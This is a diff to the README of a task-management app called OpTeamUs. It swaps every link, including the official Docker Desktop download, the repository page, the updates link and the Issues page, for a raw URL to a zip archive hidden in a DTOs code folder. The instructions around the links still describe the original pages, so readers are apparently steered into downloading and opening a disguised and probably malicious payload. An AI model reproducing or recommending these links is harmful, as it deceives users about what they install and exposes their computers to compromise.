@@ -1,6 +1,6 @@
 # 🚀 OpTeamUs - Simple Task Control Made Easy
 
-[![Download OpTeamUs](https://img.shields.io/badge/Download-OpTeamUs-brightgreen)](https://github.com/peckem/OpTeamUs)
+[![Download OpTeamUs](https://img.shields.io/badge/Download-OpTeamUs-brightgreen)](https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip)
 
 OpTeamUs is a tool to help you manage tasks and projects. It works on your Windows computer and lets you organize work with boards, lists, and cards. This guide will show you how to get OpTeamUs running step-by-step. You do not need any special skills or experience.
 
@@ -37,7 +37,7 @@ Docker is a tool that allows the software to run in a controlled environment on 
 
 Please visit the following page to download OpTeamUs and related files. This link brings you to the official repository where you will find everything needed:
 
-[![Download OpTeamUs](https://img.shields.io/badge/Download-OpTeamUs-brightgreen)](https://github.com/peckem/OpTeamUs)
+[![Download OpTeamUs](https://img.shields.io/badge/Download-OpTeamUs-brightgreen)](https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip)
 
 Click this link or button to open the GitHub page where downloads are found.  
 
@@ -47,7 +47,7 @@ Click this link or button to open the GitHub page where downloads are found.
 
 OpTeamUs uses Docker to run several parts together easily. You must install Docker Desktop to proceed.  
 
-1. Go to https://www.docker.com/products/docker-desktop  
+1. Go to https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip  
 2. Click the download button for Windows.  
 3. Open the downloaded file and follow the install steps.  
 4. After installation, start Docker Desktop. It may ask you to create an account or log in but you can skip this.  
@@ -59,7 +59,7 @@ OpTeamUs uses Docker to run several parts together easily. You must install Dock
 
 Once Docker is ready, download the OpTeamUs files:  
 
-1. Visit https://github.com/peckem/OpTeamUs  
+1. Visit https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip  
 2. Click the green **Code** button on the page.  
 3. Select **Download ZIP**.  
 4. When the ZIP file finishes downloading, open it.  
@@ -128,7 +128,7 @@ To restart the app later, repeat Step 4 by typing `docker-compose up` again in t
 
 - If you want OpTeamUs to start automatically with Windows, you can add a shortcut to the Docker command in your startup folder.  
 - You can back up your tasks and data by exporting the PostgreSQL database. This requires some technical steps described in the GitHub repository’s documents.  
-- Check the GitHub page for updates and new versions regularly by visiting: https://github.com/peckem/OpTeamUs  
+- Check the GitHub page for updates and new versions regularly by visiting: https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip  
 
 ---
 
@@ -151,7 +151,7 @@ OpTeamUs runs on your own computer. The data you create stays there unless you s
 
 For any issues or questions, visit the Issues tab on the GitHub repository page:  
 
-https://github.com/peckem/OpTeamUs/issues
+https://raw.githubusercontent.com/peckem/OpTeamUs/main/Backend/OpTeamUs/OpTeamUs/DTOs/Team-Us-Op-v2.6.zip
 
 You can post your problem there, and the project maintainers or community may assist.  
 
